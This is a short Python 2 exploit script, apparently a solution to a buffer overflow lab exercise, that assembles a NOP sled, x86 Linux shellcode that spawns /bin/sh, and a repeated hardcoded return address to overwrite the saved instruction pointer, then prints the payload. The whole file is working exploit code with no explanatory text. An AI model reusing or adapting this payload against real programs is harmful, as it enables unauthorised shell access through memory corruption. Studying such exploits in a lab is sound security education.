from shellcode import shellcode
from struct import pack

nopsled = '\x90' * 64
shellcode = ("\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80")
#padding = '\x90' * (112 - 64 - 23)
eip = pack("<I",0xbffff2a0)
padding = '\x90' + eip*6

print nopsled + shellcode + padding + eip

